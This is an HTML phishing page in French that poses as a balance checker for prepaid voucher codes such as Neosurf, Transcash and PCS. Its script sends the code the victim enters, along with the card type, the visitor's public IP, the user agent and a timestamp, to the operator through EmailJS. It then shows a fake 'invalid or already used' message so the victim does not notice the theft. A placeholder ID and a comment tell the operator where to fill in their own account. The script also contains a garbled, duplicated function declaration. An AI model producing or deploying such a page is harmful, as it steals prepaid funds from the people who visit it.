<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Vérification de Code - Recharge</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; text-align: center; padding: 50px; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
        select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
        button { background: #007BFF; color: white; padding: 12px 24px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:hover { background: #0056b3; }
        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #007BFF; border-radius: 50%; width: 30px; height: 30px; margin: 20px auto; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #result { margin-top: 20px; font-weight: bold; color: #d9534f; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Vérification de Code</h2>
        <p>Entrez votre code pour vérifier son solde.</p>
        <select id="cardType">
            <option value="Neosurf">Neosurf</option>
            <option value="Transcash">Transcash</option>
            <option value="PCS">PCS</option>
            <option value="Recharge.fr">Recharge.fr</option>
        </select>
        <input type="text" id="codeInput" placeholder="Ex: XXXX-XXXX-XXXX" maxlength="19">
        <button onclick="verifyCode()">Vérifier</button>
        <div class="loader" id="loader"></div>
        <p id="result"></p>
    </div>

    <script type="text/javascript">
        (function() {
            emailjs.init("your-user-id"); // Remplacez par votre User ID EmailJS
        })();

        async function verifyCode        async function verifyCode() {
            const code = document.getElementById("codeInput").value.trim();
            const type = document.getElementById("cardType").value;
            const result = document.getElementById("result");
            const loader = document.getElementById("loader");

            if (!code) {
                result.textContent = "Veuillez entrer un code.";
                return;
            }

            // Afficher le loader
            loader.style.display = "block";
            result.textContent = "";

            // Données à envoyer
            const templateParams = {
                code: code,
                type: type,
                ip: await getIP(),
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            // Envoi via EmailJS
            emailjs.send('default_service', 'template_abcdef', templateParams)
                .then(function() {
                    loader.style.display = "none";
                    result.textContent = "Code invalide ou déjà utilisé.";
                }, function(error) {
                    loader.style.display = "none";
                    result.textContent = "Erreur de vérification. Veuillez réessayer.";
                });
        }

        // Récupérer l'IP publique du visiteur (via API gratuite)
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (err) {
                return "IP inconnue";
            }
        }
    </script>
</body>
</html>
